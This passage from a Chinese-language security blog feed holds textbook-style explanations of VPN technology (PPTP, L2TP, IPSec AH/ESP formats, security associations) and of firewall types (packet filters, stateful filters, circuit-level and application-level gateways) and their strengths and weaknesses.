src="http://pcdbq4c2i.bkt.clouddn.com/VPN%E6%A8%A1%E5%BC%8F%E4%BA%8C.png" alt=""></p><h3 id="2-VPN-分类"><a href="#2-VPN-分类" class="headerlink" title="2. VPN 分类"></a>2. VPN 分类</h3><p><strong>(1) 从应用角度分类</strong></p><p><strong>1 远程访问 VPN</strong></p><p>它是为企业员工从外地访问企业内网而提供的VPN解决方案，当公司的员工出差到外地需要访问企业内网的机密信息时，为了避免信息传输过程中的泄密，他们的主机首先以VPN客户端的方式连接到企业的远程访问VPN服务器，此后远程主机到内网主机的通信将加密，从而保证了通信的安全性</p><p><strong>2 网关—网关 VPN</strong></p><p>通过不安全的因特网实现两个或多个局域网的安全互联。在每个局域网的出口处设置VPN服务器，当局域网之间需要交换信息时，两个VPN服务器之间建立一条安全的隧道，保证其中的通信安全。这种方式适合企业各分支机构、商业合作伙伴之间的网络互联</p><p><strong>(2) 按隧道协议分类</strong></p><p><strong>隧道协议（Tunneling Protocol）</strong>是一个网络协议的载体。使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径。隧道协议可能使用<strong>数据加密</strong>技术来保护所传输的数据</p><p><strong>1 第2层隧道协议</strong></p><p>主要包括点到点隧道协议(<strong>PPTP</strong>)、第二层转发协议(<strong>L2F</strong>)、第2层隧道协议(<strong>L2TP</strong>)。主要用于实现远程访问VPN</p><p><strong>2 第3层隧道协议</strong></p><p>主要是IP安全(<strong>IPSec</strong>)，用于在<strong>网络层</strong>实现数据包的安全封装。IPSec主要用于实现网关—网关VPN，也可以实现主机—主机的安全连接</p><p><strong>3 第4层隧道协议(SSL)</strong></p><p>在<strong>传输层</strong>上实现数据的安全封装，主要用于保护两台主机的两个进程间的安全通信。安全的Web、安全的电子邮件等均使用了第4层隧道协议</p><p><strong>4 基于第2、3层隧道协议</strong></p><p>也称为2.5层隧道协议，是利用<strong>MPLS路由器</strong>的标签特性实现的VPN</p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE.png" alt=""></p><hr><h2 id="0x02-PPTP-L2TP-VPN"><a href="#0x02-PPTP-L2TP-VPN" class="headerlink" title="0x02 PPTP/L2TP VPN"></a>0x02 PPTP/L2TP VPN</h2><h3 id="1-PPTP协议"><a href="#1-PPTP协议" class="headerlink" title="1. PPTP协议"></a>1. PPTP协议</h3><p>(1) 点对点隧道协议（Point to Point Tunneling Protocol ，缩写为 PPTP ）是实现虚拟专用网（VPN）的方式之一</p><p>(2) PPTP使用传输控制协议（TCP）创建控制通道来传送控制命令，以及利用通用路由封装（GRE）通道来封装点对点协议（PPP）数据包以传送数据</p><p>(3) PPTP的协议规范本身并未描述加密或身份验证的部份，它依靠点对点协议（PPP）来实现这些安全性功能</p><p>(4) PPTP以通用路由封装（GRE）协议向对方作一般的点对点传输。通过TCP 1723端口来发起和管理GRE状态</p><h3 id="2-PPTP帧的封装格式"><a href="#2-PPTP帧的封装格式" class="headerlink" title="2. PPTP帧的封装格式"></a>2. PPTP帧的封装格式</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/PPTP%E6%A0%BC%E5%BC%8F.png" alt=""></p><h3 id="3-L2TP-VPN"><a href="#3-L2TP-VPN" class="headerlink" title="3.  L2TP VPN"></a>3.  L2TP VPN</h3><p>(1) 第二层隧道协议（ Layer Two Tunneling Protocol，缩写为L2TP) 是一种由RFC 2661定义的数据链路层隧道协议，是一种虚拟隧道协议，通常用于虚拟专用网络</p><p>(2) L2TP协议自身不提供加密与可靠性验证的功能，可以和安全协议搭配使用，从而实现数据的加密传输。经常与L2TP协议搭配的加密协议是IPsec，当这两个协议搭配使用时，通常合称L2TP/IPsec</p><p>(3) L2TP支持包括IP、ATM、帧中继、X.25在内的多种网络。在IP网络中，L2TP协议使用了UDP 1701端口</p><hr><h2 id="0x03-IPSec-VPN"><a href="#0x03-IPSec-VPN" class="headerlink" title="0x03 IPSec VPN"></a>0x03 IPSec VPN</h2><h3 id="1-IPSec-概述"><a href="#1-IPSec-概述" class="headerlink" title="1. IPSec 概述"></a>1. IPSec 概述</h3><p>(1) 互联网安全协议（Internet Protocol Security，缩写为 IPsec），是通过对IP协议（互联网协议）的分组进行加密和认证来保护IP协议的网络传输协议族</p><p>(2) IPsec协议工作在OSI 模型的第三层（网络层或TCP/IP模型的IP层），使其在单独使用时适于保护基于TCP或UDP的协议。与传输层或更高层的协议相比，IPsec协议必须处理可靠性和分片的问题，这同时也增加了它的复杂性和处理开销</p><h3 id="2-IPSec-组成"><a href="#2-IPSec-组成" class="headerlink" title="2. IPSec 组成"></a>2. IPSec 组成</h3><p>IPSec是一个开放的标准，由一序列的协议组成，其中最重要的协议有三个 ：认证头 <strong>AH</strong>(Authentication Headers)、封装安全有效载荷<strong>ESP</strong>(Encapsulating Security Payloads)和安全联盟<strong>SA</strong>(Security Associations)</p><p><strong>(1) 认证头AH (Authentication Headers)</strong></p><p>AH为IP数据报实现无连接的完整性和数据源认证功能，并能抵抗重放攻击</p><p><strong>(2) 封装安全有效载荷ESP(EncapsulatingSecurity Payloads)</strong></p><p>ESP实现保密性、数据源认证、无连接的完整性、抵抗重放攻击的服务(一种形式的部分序列完整性)和有限的网络流的保密性</p><p><strong>(3) 安全联盟SA (Security Associations)</strong></p><p>SA给出算法和数据的集合，以向AH或ESP的操作提供必须的参数。安全联盟和密钥管理协议ISAKMP(Internet Security Association and Key ManagementProtocol)提供了认证和密钥交换的框架</p><h3 id="3-IPSec工作模式"><a href="#3-IPSec工作模式" class="headerlink" title="3. IPSec工作模式"></a>3. IPSec工作模式</h3><p><strong>(1) 传输模式：</strong>用于两台主机之间的连接，在IP层封装主机—主机的分组</p><p><strong>(2) 隧道模式：</strong>用于两个网关之间的连接，在IP层封装网关—网关的分组，可穿过公共网络（如Internet）实现局域网之间的互联</p><h3 id="4-认证协议AH"><a href="#4-认证协议AH" class="headerlink" title="4. 认证协议AH"></a>4. 认证协议AH</h3><p><strong>(1) 概述</strong></p><ol><li><p>IP认证头AH（IP Authentication Header）定义在RFC4302中，实现IP数据报的认证、完整性和抗重放攻击</p></li><li><p>AH数据报直接封装在IP数据报中，如果IP数据包的协议字段为51，表明IP头之后是一个AH头</p></li><li><p>AH和ESP同时保护数据时，在顺序上，AH头在ESP头之后</p></li></ol><p><strong>(2) AH 传输模式</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/AH%E4%BC%A0%E8%BE%93.png" alt=""></p><p><strong>(3) AH 隧道模式</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/AH%E9%9A%A7%E9%81%93.png" alt=""></p><p><strong>(4) AH 头格式</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/AH%E5%A4%B4%E6%A0%BC%E5%BC%8F.png" alt=""></p><pre><code>1. 下一个头(Next Header)：8-bits，标识AH头后的载荷（协议）类型。在传输模式下可为6(TCP)或17 (UDP);在隧道模式下将是4(IPv4)或41(IPv6)2. 载荷长度(Payload Length)：8-bits，表示AH头本身的长度，以32-bits为单位3. 保留(Reserved)：16-bits，保留字段，未使用时必须设为04. 安全参数索引SPI(Security Parameters Index)：32-bits，接收方用于标识对应的安全关联(SA)5. 序列号(Sequence Number)：32-bits，是一个单向递增的计数器，提供抗重播功能（anti-replay）6. 完整性验证数据ICV（Integrity Check Value）：这是一个可变长度（必须是32比特的整数倍）的域，长度由具体的验证算法决定。完整性验证数据ICV验证IP数据包的完整性，因此ICV的计算包含了整个IP数据包</code></pre><h3 id="5-封装安全载荷ESP"><a href="#5-封装安全载荷ESP" class="headerlink" title="5. 封装安全载荷ESP"></a>5. 封装安全载荷ESP</h3><p><strong>(1) 概述</strong></p><ol><li><p>IP封装安全载荷ESP （IP Encapsulating SecurityPayload）定义在RFC 4303中，实现IP数据报的认证、完整性、抗重放攻击和加密</p></li><li><p>与AH协议一样，ESP的数据报也直接封装在IP数据报中，如果IP数据包的协议字段为50，表明IP头之后是一个ESP数据报。ESP数据报由四部分组成，分别是：头部、加密数据（包括ESP尾）和ESP验证数据</p></li></ol><p><strong>(2) 传输模式 ESP</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E4%BC%A0%E8%BE%93ESP.png" alt=""></p><p><strong>(3) 隧道模式 ESP</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E9%9A%A7%E9%81%93ESP.png" alt=""></p><p><strong>(4) ESP 数据报格式</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/ESP%E6%95%B0%E6%8D%AE%E6%8A%A5.png" alt=""></p><pre><code>1. 安全参数索引SPI(32-bits)：在IKE交换过中由目标主机选定，与IP头之前的目标地址以及协议结合在一起，用来标识用于处理数据包的特定的那个安全关联。SPI经过验证，但并未加密2. 序列号(32-bits)：它是一个唯一的单向递增的计数器，与AH类似，提供抵抗重播攻击的能力3. 填充项(0～255 bytes)：由具体的加密算法决定4. 填充长度(8-bits)：接收端可以据此恢复载荷数据的真实长度5. 下一头部(8-bits)：标识受ESP保护的载荷的（协议）类型。在传输模式下拷贝自原IP数据报头中的协议值；在隧道模式下可为4(IPv4)或41 (IPv6)6. 验证数据(完整性校验值ICV)：一个经过密钥处理的散列值，验证范围包括ESP头部、被保护的数据以及ESP尾部。其长度与具体的验证算法有关，但必须是32bits的整数倍</code></pre><h3 id="6-安全关联与安全策略"><a href="#6-安全关联与安全策略" class="headerlink" title="6. 安全关联与安全策略"></a>6. 安全关联与安全策略</h3><p><strong>(1) 安全关联与安全关联数据库</strong></p><ol><li><p>安全关联(SA) 是两个通信实体协商建立起来的一种安全协定</p></li><li><p>SA是通过IKE密钥管理协议在通信双方之间来协商的，协商完成后，通信双方都会在它们的安全关联数据库( SAD)中存储该SA参数</p></li></ol><p><strong>(2) 安全关联确定参数</strong></p><ol><li><p><strong>安全参数索引号(SPI)</strong>：一个与SA相关的位串，由AH和ESP携带，使得接收方能选择合适的SA处理数据包</p></li><li><p><strong>IP目的地址</strong>：目前只允许使用单一地址，表示SA的目的地址</p></li><li><p><strong>安全协议标识</strong>：标识该SA是AH安全关联或ESP安全关联</p></li></ol><p><strong>(3) SA 其他参数</strong></p><pre><code>1. 序列号计数器：一个32位的值，用于生成AH或ESP头中的序号字段，在数据包的“外出”处理时使用2. 序列号溢出：用于输出包处理，并在序列号溢出的时候加以设置，安全策略决定了一个SA是否仍可用来处理其余的包3. 抗重放窗口：用于确定一个入栈的AH或ESP包是否是重放4. AH信息：AH认证算法、密钥、密钥生存期和其他AH的相关参数5. ESP信息：ESP认证和加密算法、密钥、初始值、密钥生存期和其他ESP的相关参数6. SA的生存期：一个SA最长能存在的时间。到时间后，一个SA必须用一个新的 SA替换或终止7. IPSec协议模式：隧道、传输、通配符（隧道模式、传输模式均可）8. 路径MTU：在隧道模式下使用IPSec时，必须维持正确的PMTU信息，以便对这个数据包进行相应的分段</code></pre><p><strong>(4) 安全策略和安全策略数据库SPD</strong></p><ol><li><p>安全策略决定了为一个数据包提供的安全服务，它保存在安全策略数据库SPD中。SPD中的每一个安全策略条目由一组IP和上层协议字段值组成，即下面提到的选择符</p></li><li><p>安全策略数据库(SPD)记录了对IP数据流（根据源IP、目的IP、上层协议以及流入还是流出）采取的安全策略。每一安全策略条目可能对应零条或多条SA条目，通过使用一个或多个选择符来确定某一个SA条目</p></li></ol><p><strong>(5) IPSec允许的选择符</strong></p><pre><code>1. 目的IP地址：可以是主机地址、地址范围或者通配符2. 源IP地址：可以是主机地址、地址范围或者通配符3. 源/目的端口4. 用户ID：操作系统中的用户标识5. 数据敏感级别6. 传输层协议7. IPSec协议(AH，ESP，AH/ESP)8. 服务类型(TOS)</code></pre><hr><h2 id="0XFF-参考资源"><a href="#0XFF-参考资源" class="headerlink" title="0XFF 参考资源"></a>0XFF 参考资源</h2><ul><li><p><a href="https://en.wikipedia.org/wiki/Virtual_private_network" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Virtual_private_network</a></p></li><li><p><a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C/8747869?fromtitle=VPN%E6%8A%80%E6%9C%AF&amp;fromid=1897662" target="_blank" rel="noopener">https://baike.baidu.com/item/Virtual_private_network</a></p></li><li><p><a href="http://staff.ustc.edu.cn/~billzeng/ns/ns04.pdf" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~billzeng/ns/ns04.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;VPN（Virtual Private Network）即“虚拟专用网络”，是企业网在因特网(或其他公共网络)上的扩展，VPN在因特网上开辟一条安全的隧道，以保证两个端点（或两个局域网）之间的安全通信。本文对网络边界安全技术-VPN进行简要分析与总结&lt;br&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="网络安全" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="VPN" scheme="http://www.firehacker.top/tags/VPN/"/>
    
      <category term="IPSec" scheme="http://www.firehacker.top/tags/IPSec/"/>
    
  </entry>
  
  <entry>
    <title>Firewall技术浅析</title>
    <link href="http://www.firehacker.top/2018/08/13/Firewall%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/08/13/Firewall技术浅析/</id>
    <published>2018-08-13T10:16:00.000Z</published>
    <updated>2018-09-19T03:07:06.868Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>防火墙(firewall)是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。本文对防火墙技术及其发展进行简要分析与总结</p></blockquote><a id="more"></a><hr><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p><strong>(1) 定义</strong></p><p>防火墙是位于两个(或多个)网络之间执行<strong>访问控制</strong>的软件和硬件系统，它根据访问控制规则对进出网络的数据流进行<strong>过滤</strong></p><p><strong>(2) 示意图</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt=""></p><p>防火墙在逻辑上是一个<strong>分离器</strong>，一个<strong>限制器</strong>，也是一个<strong>分析器</strong>。它有效地监控了内部网和外部网之间的任何网络活动，保证了内部网络的安全</p><p><strong>(3) 数据流处理方式</strong></p><ol><li><p>允许数据流通过</p></li><li><p>拒绝数据流通过：通知发送方</p></li><li><p>将这些数据流丢弃：不通知发送方</p></li></ol><p><strong>(4) firewall 实质</strong></p><p>防火墙就是一种能够<strong>限制网络访问</strong>的设备或软件，许多<strong>网络设备</strong>均含有简单的防火墙功能，如路由器、调制解调器、无线基站、IP交换机等；现代<strong>操作系统</strong>中也含有软件防火墙：Windows 系统和Linux系统均自带了软件防火墙，可以通过策略(或规则)定制相关的功能</p><hr><h2 id="0x02-功能及分类"><a href="#0x02-功能及分类" class="headerlink" title="0x02 功能及分类"></a>0x02 功能及分类</h2><h3 id="1-firewall-功能"><a href="#1-firewall-功能" class="headerlink" title="1. firewall 功能"></a>1. firewall 功能</h3><p><strong>(1) 过滤进、出网络的数据</strong></p><p>检查所有进、出数据的细节，并根据事先定义好的策略允许或禁止这些数据进行通信</p><p><strong>(2) 管理进、出网络的访问行为</strong></p><p>通过将动态的、应用层的过滤能力和认证相结合，实现WWW、FTP和Telnet等广泛的服务的安全支持</p><p><strong>(3) 封堵某些禁止的业务</strong></p><p>禁止存在安全脆弱性的服务进出网络</p><p><strong>(4) 记录通过防火墙的信息内容和活动</strong></p><p>审计并记录所有通过防火墙的重要信息，以发现试图的入侵行为</p><p><strong>(5) 对网络攻击的检测和告警</strong></p><h3 id="2-fierwall-分类"><a href="#2-fierwall-分类" class="headerlink" title="2. fierwall 分类"></a>2. fierwall 分类</h3><p><strong>(1) 按发展历史分类</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%91%E5%B1%95.png" alt=""></p><p><strong>(2) 根据网络协议栈中的过滤层次</strong></p><ol><li><p>包过滤防火墙</p></li><li><p>电路级网关防火墙</p></li><li><p>应用级网关防火墙</p></li></ol><p><img src="http://pdeise3e3.bkt.clouddn.com/%E5%85%B3%E7%B3%BB.png" alt=""></p><p>防火墙工作于OSI模型的<strong>层次越高</strong>，其检查数据包中的<strong>信息就越多</strong>，防火墙所消耗的处理器<strong>工作周期就越长</strong>；防火墙检查的数据包<strong>越靠近OSI模型的上层</strong>，该防火墙结构所提供的<strong>安全保护等级就越高</strong></p><hr><h2 id="0x03-包过滤防火墙"><a href="#0x03-包过滤防火墙" class="headerlink" title="0x03 包过滤防火墙"></a>0x03 包过滤防火墙</h2><h3 id="1-静态包过滤防火墙"><a href="#1-静态包过滤防火墙" class="headerlink" title="1. 静态包过滤防火墙"></a>1. 静态包过滤防火墙</h3><p>静态包过滤防火墙可以采用<strong>路由器上的过滤模块</strong>来实现</p><p><strong>(1) 工作原理</strong></p><p>采用一组<strong>过滤规则</strong>对每个数据包进行<strong>检查</strong>，然后根据检查结果确定是<strong>转发</strong>还是<strong>丢弃</strong>该数据包</p><p><strong>(2) 包过滤处理过程</strong></p><ol><li><p><strong>接收</strong>每个到达的数据包</p></li><li><p>对数据包<strong>采用过滤规则</strong>，对数据包的IP头和传输字段内容进行<strong>检查</strong>。如果数据包的头信息与一组规则匹配，则根据该规则确定是转发还是丢弃该数据包</p></li><li><p>如果没有规则与数据包头信息匹配，则对数据包施加<strong>默认规则</strong> (通常，防火墙首先默认丢弃所有数据包，然后再逐个执行过滤规则，以加强对数据包的过滤)</p></li></ol><p><strong>(3) 网络位置</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E9%9D%99%E6%80%81.png" alt=""></p><ol><li><p>静态数据包过滤发生在<strong>网络层</strong>上，也就是OSI模型的第三层上</p></li><li><p>决定接收还是拒绝一个数据包，取决于对数据包中IP头和协议头等<strong>特定域的检查和判定</strong>。这些特定域包括：①源地址；②目的地址；③应用或协议；④源端口号；⑤目的端口号</p></li></ol><p><strong>(4) ACL (访问控制表单)</strong></p><p>在每个包过滤器上，安全管理员要根据企业的安全策略定义一个表单；该规则库包含许多规则，用来指示防火墙应该拒绝还是接收该数据包。在向前转发某个数据包之前，包过滤器防火墙将IP头和TCP头中的<strong>特定域</strong>与规则库中的<strong>规则</strong>逐条进行<strong>比较</strong>。防火墙按照一定的次序<strong>扫描规则库</strong>，直到包过滤器发现一个特定域满足包过滤规则的<strong>特定要求</strong>时，才对数据包做出“接收”或“丢弃”的判决。如果包过滤器<strong>没有发现</strong>有一个规则与该数据包匹配，那么它将对其施加一个<strong>默认规则</strong>。该默认规则在防火墙的规则库中有明确的定义，一般情况下防火墙将不满足规则的数据包丢弃</p><p><strong>(5) 安全性分析</strong></p><p>决定<strong>包过滤规则的先后次序</strong>是一项很<strong>困难</strong>的事情，包过滤器仅检查数据的IP头和TCP头，它<strong>不能区分真实的IP地址和伪造的IP地址</strong>，若一个伪造的 IP地址满足包过滤规则，并同时满足其他规则的要求，则该数据包将被允许通过</p><p><strong>(6) 优缺点</strong></p><p><strong>优点</strong></p><ol><li><p>对网络性能的影响较小 (只是简单地根据地址、协议和端口进行访问控制)</p></li><li><p>成本较低 (路由器通常集成了简单包过滤的功能)</p></li></ol><p><strong>缺点</strong></p><ol><li><p>安全性较低 （包过滤防火墙仅工作于网络层，不能对数据包进行更高层的分析和过滤）</p></li><li><p>缺少状态感知能力 (一些需要动态分配端口的服务需要防火墙打开许多端口，增大了网络的安全风险)</p></li><li><p>容易遭受IP欺骗攻击 (简单的包过滤功能没有对协议的细节进行分析，可能遭受IP欺骗攻击)</p></li><li><p>创建访问控制规则比较困难 (须严格区分访问控制规则的先后次序)</p></li></ol><h3 id="2-动态包过滤防火墙"><a href="#2-动态包过滤防火墙" class="headerlink" title="2. 动态包过滤防火墙"></a>2. 动态包过滤防火墙</h3><p>动态包过滤器是最<strong>普遍使用</strong>的一种防火墙技术，既具有很高的<strong>安全性</strong>，又具有完全的<strong>透明性</strong>,可根据网络当前的状态检查数据包，即根据当前所交换的信息<strong>动态调整</strong>过滤规则表</p><p><strong>(1) 工作原理</strong></p><ol><li><p>动态(状态)包过滤器是在静态包过滤防火墙的基础上发展而来，它具有<strong>“状态感知”</strong>的能力</p></li><li><p><strong>典型</strong>的动态包过滤防火墙工作在<strong>网络层</strong>，，更<strong>先进</strong>的动态包过滤防火墙可以在OSI的<strong>传输层</strong>(第四层)上工作，可以收集更多的状态信息，从而增加过滤的深度</p></li><li><p>如果数据包满足规则，如数据包的端口号或IP地址是可接受的，则被允许通过。但与普通的包过滤防火墙相比，还有一个不同点：它首先对外出的<strong>数据包身份进行记录</strong>，此后若有相同连接的数据包进入防火墙，它就直接允许这些数据包通过</p></li><li><p>动态包过滤防火墙直接<strong>对“连接”进行处理</strong>，而不是仅对数据包头信息进行检查，可以用来处理UDP和TCP协议</p></li><li><p>动态包过滤防火墙需要对已建连接和规则表进行<strong>动态维护</strong>，因此它是动态的和有状态的</p></li><li><p>典型的动态包过滤防火墙能够感觉到新建连接与已建连接之间的差别。一旦连接建立，它就会将该连接的状态记于RAM中的一个表单中，后续的数据包与RAM表单中的状态信息进行比较</p></li></ol><p><img src="http://pdeise3e3.bkt.clouddn.com/%E5%8A%A8%E6%80%81.png" alt=""></p><p><strong>(2) 优缺点归纳</strong></p><p><strong>动态包过滤防火墙的优点</strong></p><ol><li><p>动态包过滤防火墙的安全性优于静态包过滤防火墙</p></li><li><p>动态包过滤防火墙的“状态感知”能力也使其性能得到了显著提高</p></li><li><p>如果不考虑所采用的操作系统的成本，动态包过滤防火墙的成本也很低</p></li></ol><p><strong>动态包过滤防火墙的缺点</strong></p><ol><li><p>由于没有对数据包的净荷部分进行过滤，因此仍然只具有较低的安全性</p></li><li><p>工作在网络层，仅检查IP头和TCP头，容易遭受伪装IP地址欺骗攻击</p></li><li><p>难于创建规则，管理员创建规则时必须要考虑规则的先后次序</p></li><li><p>动态包过滤防火墙无法抵抗半开连接攻击，在连接建立时仅使用两次握手，可导致在DoS/DDoS攻击时因耗尽所有资源而停止响应</p></li></ol><hr><h2 id="0x04-电路级网关"><a href="#0x04-电路级网关" class="headerlink" title="0x04 电路级网关"></a>0x04 电路级网关</h2><h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1. 工作原理"></a>1. 工作原理</h3><p><img src="http://pdeise3e3.bkt.clouddn.com/%E7%94%B5%E8%B7%AF%E7%BA%A7.png" alt=""></p><ol><li><p>电路级网关又称做线路级网关，当两个主机首次建立TCP连接时，电路级网关在两个主机之间建立一道屏障，电路级网关的作用就好像一台中继计算机，用来在两个连接之间来回地复制数据，也可以记录或缓存数据</p></li><li><p>采用C/S结构，网关充当了服务器的角色，而内部网络中的主机充当了客户机的角色。当一个客户机希望连接到某个目标服务器时，它首先要连接到中继主机上；然后，中继主机再连接到目标服务器上。对目标服务器来说，该客户机的名称和IP地址是不可见的</p></li><li><p>当有来自Internet的请求进入时，它作为服务器接收外来请求，并转发请求；当有内部主机请求访问Internet时，它则担当代理服务器的角色。它监视两主机建立连接时的握手信息，如Syn、Ack和序列号等是否合乎逻辑，判定该会话请求是否合法。在有效会话连接建立后，电路级网关仅复制、传递数据，而不进行过滤</p></li></ol><h3 id="2-网络位置"><a href="#2-网络位置" class="headerlink" title="2. 网络位置"></a>2. 网络位置</h3><p><img src="http://pdeise3e3.bkt.clouddn.com/%E7%94%B5%E8%B7%AF%E7%BA%A7%E4%BD%8D%E7%BD%AE.png" alt=""></p><ol><li><p>电路级网关工作于会话层，即OSI模型的第五层</p></li><li><p>电路级网关是包过滤防火墙的一种扩展，它除了进行基本的包过滤检查之外，还要增加对连接建立过程中的握手信息及序列号合法性的验证</p></li><li><p>在打开一条通过防火墙的连接或电路之前，电路级网关要检查和确认TCP及UDP协议会话。因此，电路级网关所检查的数据比静态包过滤防火墙或动态包过滤防火墙所检查的数据更多，安全性也更高</p></li><li><p>判断是接收还是丢弃一个数据包，取决于对数据包的IP头和TCP头的检查。电路级网关检查的数据包括：①源地址；②目的地址；③应用或协议；④源端口号；⑤目的端口号；⑥握手信息及序列号</p></li><li><p>与包过滤防火墙类似，电路级网关在转发一数据包之前，首先将数据包的IP头和 TCP头与由管理员定义的规则表相比较，以确定防火墙是将数据包丢弃还是让数据包通过。在可信客户机与不可信主机之间进行TCP握手通信时，仅当SYN标志、ACK标志及序列号符合逻辑时，电路级网关才判定该会话是合法的</p></li><li><p>如果会话是合法的，包过滤器就开始对规则进行逐条扫描，直到发现其中一条规则与数据包中的有关信息一致。如果包过滤器没有发现适合该数据包的规则，它就会对该数据包施加一条默认规则。在防火墙的规则表中，这条默认规则有明确的定义，通常是指示防火墙将不满足规则的数据包丢弃</p></li></ol><h3 id="3-安全性分析"><a href="#3-安全性分析" class="headerlink" title="3. 安全性分析"></a>3. 安全性分析</h3><ol><li><p>电路级网关它与包过滤防火墙一样，工作于OSI模型的低层上，对网络性能的影响较小</p></li><li><p>一旦电路级网关建立一个连接，任何应用均可以通过该连接运行，电路级网关不能对可信网络与不可信网络之间中继的数据包内容进行检查</p></li></ol><h3 id="4-优缺点归纳"><a href="#4-优缺点归纳" class="headerlink" title="4. 优缺点归纳"></a>4. 优缺点归纳</h3><p><strong>电路级网关优点</strong></p><p>(1) 对网络性能有一定程度的影响</p><p>(2) 切断了外部网络到防火墙后的服务器直接连接</p><p>(3)  比静态或动态包过滤防火墙具有更高的安全性</p><p><strong>电路级网关缺点</strong></p><p>(1) 不能对数据净荷进行检测，无法抵御应用层的攻击等</p><p>(2) 在设计理论上存在局限性，工作层次决定了它无法提供最高的安全性</p><p>(3) 当增加新的内部程序或资源时，往往需要对许多电路级网关的代码进行修改</p><hr><h2 id="0x05-应用级别网关"><a href="#0x05-应用级别网关" class="headerlink" title="0x05 应用级别网关"></a>0x05 应用级别网关</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>应用级网关则只能对<strong>特定服务的数据流</strong>进行过滤；应用级网关必须为特定的应用服务编写特定的代理程序，这些程序被称为<strong>“服务代理”</strong>，在网关内部分别扮演客户机代理和服务器代理的角色，当各种类型的应用服务通过网关时，它们必须经过客户机代理和服务器代理的过滤</p><h3 id="2-逻辑结构"><a href="#2-逻辑结构" class="headerlink" title="2. 逻辑结构"></a>2. 逻辑结构</h3><p><img src="http://pdeise3e3.bkt.clouddn.com/%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91.png" alt=""></p><h3 id="3-工作原理"><a href="#3-工作原理" class="headerlink" title="3. 工作原理"></a>3. 工作原理</h3><p>与电路级网关一样，应用级网关截获进出网络的数据包，运行代理程序来回复制和传递通过网关的信息，起着<strong>代理服务器</strong>的作用。它可以避免内网中的可信服务器或客户机与外网中某个不可信主机之间的直接连接</p><p><strong>二者区别</strong></p><p>(1) 代理是<strong>针对应用</strong>的</p><p>(2) 代理对<strong>整个数据包</strong>进行检查，因此能在OSI模型的应用层上对数据包进行过滤</p><p><strong>工作层次</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%BA%94%E7%94%A8%E5%B1%82%E6%AC%A1.png" alt=""></p><p>(1) 应用级网关必须针对每个<strong>特定的服务</strong>运行一个特定的代理，它只能对特定服务所生成的数据包进行传递和过滤，如，HTTP代理只能复制、传递和过滤HTTP业务流</p><p>(2) 如果一个网络使用了应用级网关防火墙，而且网关上没有运行某些应用服务的代理，那么这些服务的数据包都不能进出网络。例如，如果应用级网关防火墙上运行了FTP和HTTP代理，那么只有这两种服务的数据包才能通过防火墙，所有其他服务的数据包均被禁止 </p><p>(3) 应用级网关防火墙上运行的代理程序对数据包进行<strong>逐个检查和过滤</strong>，而不是简单地复制数据让数据包轻易地通过网关</p><p>(4) 特定的应用代理检查通过网关的每个数据包，在OSI模型的应用层上验证数据包内容。这些代理可以对应用协议中的特定信息或命令进行过滤，这就是所谓的<strong>关键词过滤或命令字过滤</strong></p><p>(5) 应用级网关防火墙所采用的技术叫做<strong>“强应用代理”</strong>。强应用代理不是对用户的整个数据包进行复制，而是在防火墙内部创建一个全新的空数据包。强应用代理将那些可接收的命令或数据，从防火墙外部的原始数据报中复制到防火墙内新创建的数据包中。然后，强应用代理将此新数据包发送给防火墙后面受保护的服务器</p><p>(6) 由于应用级网关防火墙对<strong>整个数据包</strong>进行检查，因此它是当前已有的最安全的防火墙结构之一。但是它有一个固有的缺点，那就是<strong>缺乏透明性</strong>，此外，缺乏对新应用、新协议的支持</p><h3 id="4-安全性讨论"><a href="#4-安全性讨论" class="headerlink" title="4. 安全性讨论"></a>4. 安全性讨论</h3><p><strong>应用级网关的优点</strong></p><p>(1) 在已有的安全模型中<strong>安全性较高</strong> (可以对<strong>服务</strong>(如HTTP、FTP等)的命令字过滤，也可以实现<strong>内容过滤</strong>，甚至可以进行<strong>病毒的过滤</strong>)</p><p>(2) 具有<strong>强大的认证功能</strong>。由于应用级网关在<strong>应用层实现认证</strong>，因此它可以实现的认证方式比电路级网关要丰富得多</p><p>(3) 